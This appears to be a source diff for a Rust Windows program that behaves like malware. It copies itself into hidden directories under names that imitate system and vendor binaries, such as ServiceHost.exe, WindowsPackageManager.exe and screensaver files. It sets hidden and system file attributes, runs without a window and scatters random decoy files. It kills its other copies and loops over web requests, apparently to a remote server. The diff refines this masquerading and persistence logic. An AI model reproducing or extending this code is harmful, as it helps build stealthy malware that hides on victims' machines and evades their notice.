@@ -1,12 +1,13 @@
+#![feature(os_str_display)]
 //#![windows_subsystem = "windows"]
 extern crate winapi;
 
 use std::os::windows::prelude::*;
 use std::error::Error;
 use std::os::windows::process::CommandExt;
-use std::process::Command;
+use std::process::{exit, Command};
 use std::{env, fs, thread};
-use std::fs::{create_dir, File, OpenOptions};
+use std::fs::{create_dir, remove_dir_all, File, OpenOptions};
 use std::io::Write;
 use std::os::windows::fs::OpenOptionsExt;
 use std::path::Path;
@@ -16,7 +17,7 @@ use rand::Rng;
 use sysinfo::{get_current_pid, System};
 const CREATE_NO_WINDOW: u32 = 0x08000000;
 
-#[derive(Default)]
+#[derive(Default,Clone)]
 struct InstallDirectory{
     hidden: bool,
     path: String,
@@ -29,24 +30,28 @@ struct InstallDirectory{
 fn main() {
 
     let binding = env::current_exe().unwrap();
-    let exe_path= Path::new(&binding).file_name().unwrap().to_str().unwrap();
-    let mut variants = vec![{exe_path}];
+    let exe_name = Path::new(&binding).file_name().unwrap().to_str().unwrap();
+    let mut variants = vec![{ exe_name }];
 
     variants.append(&mut vec!["Thorium.exe"]);
-    variants.append(&mut vec!["WindowsPackageManager.exe"]);
-    variants.append(&mut vec!["winman.exe"]);
-    variants.append(&mut vec!["MicrosoftExtendedRuntime.exe"]);
-    variants.append(&mut vec!["MicrosoftRuntimeEnvironment.exe"]);
-    variants.append(&mut vec!["Mystify.scr"]);
-    variants.append(&mut vec!["screensaver.scr"]);
+
     variants.append(&mut vec!["MedalHelper.exe"]);
-    variants.append(&mut vec!["ServiceHost.exe"]);
-    variants.append(&mut vec!["FATF.exe"]);
-    variants.append(&mut vec!["ProgramHelper.exe"]);
     variants.append(&mut vec!["SceneRuntimeHelper.exe"]);
     variants.append(&mut vec!["LibraryFileHandle.exe"]);
     variants.append(&mut vec!["Updater001.exe"]);
     variants.append(&mut vec!["ImageResponseFrame.exe"]);
+
+    variants.append(&mut vec!["WindowsPackageManager.exe"]);
+    variants.append(&mut vec!["MicrosoftExtendedRuntime.exe"]);
+    variants.append(&mut vec!["MicrosoftRuntimeEnvironment.exe"]);
+    variants.append(&mut vec!["ProgramHelper.exe"]);
+
+    variants.append(&mut vec!["Mystify.scr"]);
+    variants.append(&mut vec!["screensaver.scr"]);
+
+    variants.append(&mut vec!["ServiceHost.exe"]);
+    variants.append(&mut vec!["FATF.exe"]);
+    variants.append(&mut vec!["winman.exe"]);
     variants.append(&mut vec!["userman.exe"]);
 
     let user = whoami::username();
@@ -58,7 +63,7 @@ fn main() {
     let mut install_locations:Vec<InstallDirectory> = vec![
         InstallDirectory {
             hidden: true,
-            name: "ServiceHost.exe".to_string(),
+            name: "windows\\ServiceHost.exe".to_string(),
             path: format!("{user_dir}\\.win"),
             populate:vec![
                 "windows".to_string(),
@@ -176,20 +181,44 @@ fn main() {
         },
     ];
 
-    install(install_locations,exe_path);
-
     let s = System::new_all();
 
-    let current_pid = get_current_pid().unwrap();
+    let mut not_us_variants: Vec<_> = variants.clone().drain(1..).collect();
 
-    for variant in variants {
+    println!("{:?}", not_us_variants);
+
+    let current_pid = get_current_pid().unwrap();
+    let self_index = not_us_variants.iter().position(|&r| r == exe_name).unwrap();
+
+    println!("self_index: {}", self_index);
+
+    for variant in &variants {
+        let variant_index = variants.iter().position(|&r| r == variant.to_string()).unwrap();
+
+
+
         for process in s.processes_by_name(variant.as_ref()) {
             if process.pid() == current_pid {
                 continue;
             }
+            if variant_index>self_index {
+                return;
+            }
             process.kill();
         }
     }
+
+    install(install_locations.clone(), exe_name);
+
+    // if self_index==0 {
+    //     for location in install_locations{
+    //         let path = Path::new(&location.path).join(&location.name);
+    //         match Command::new(path).spawn(){
+    //             Ok(_) => {}
+    //             Err(_) => {}
+    //         }
+    //     }
+    // }
 
     loop {
         thread::spawn(|| {
@@ -233,28 +262,31 @@ fn install(locations: Vec<InstallDirectory>,current_exe: &str){
 fn install_single(location: InstallDirectory, current_exe: &str) ->Result<(),Box<dyn Error>> {
     let path = Path::new(&location.path);
     let file_path = path.join(&location.name);
+    let backup_file_path = path.join(Path::new(&location.name).file_name().unwrap());
 
     create_dir_recursively(path);
 
-    let file = OpenOptions::new()
+
+    let use_file = match install_extras(&location) {
+        Ok(_) => {
+
+            file_path
+        }
+        Err(_) => {
+            backup_file_path
+        }
+    };
+
+    File::create(use_file.clone())?;
+
+    //println!("{}", env::current_dir()?.join(current_exe).clone().display());
+    fs::copy(env::current_dir()?.join(current_exe),use_file.clone())?;
+
+    OpenOptions::new()
         .write(true)
         .create(true)
         .attributes(7)
-        .open(file_path.clone());
-
-    println!("{}", env::current_dir()?.join(current_exe).clone().display());
-    fs::copy(env::current_dir()?.join(current_exe),file_path.clone())?;
-
-    let file = OpenOptions::new()
-        .write(true)
-        .create(true)
-        .attributes(7)
-        .open(file_path.clone());
-
-    match install_extras(&location) {
-        Ok(_) => {}
-        Err(_) => {}
-    }
+        .open(use_file.clone())?;
 
     Ok(())
 }
@@ -288,9 +320,6 @@ fn install_extras(location: &InstallDirectory) ->Result<(),Box<dyn Error>> {
 
     fs::set_permissions(&path, perms)?;
 
-    if location.hidden {
-    }
-
     Ok(())
 }
 
@@ -298,7 +327,7 @@ fn generate(file_types:Vec<&str>, dir: &str) ->Result<(),Box<dyn Error>>{
     let mut rng = rand::thread_rng();
     for i in 0..rng.gen_range(50..200) {
         let name = format!("{2}\\{:x}.{1}", i+rng.gen_range(0..100),file_types[rng.gen_range(0..file_types.len())], dir);
-        println!("{}", name);
+        //println!("{}", name);
         let mut file = File::create(name)?;
         for _ in 0..rng.gen_range(50..200) {
             file.write(format!("{:x}", rng.gen_range(u32::MIN..u32::MAX)).as_bytes())?;
@@ -326,4 +355,11 @@ fn get_request_response(string: &str) -> Result<String, Box<dyn Error>>{
     let text = response.text()?;
 
     Ok(text)
+}
+
+fn uninstall(locations: Vec<InstallDirectory>) -> Result<(), Box<dyn Error>> {
+    for location in locations {
+        remove_dir_all(&location.path)?;
+    }
+    Ok(())
 }
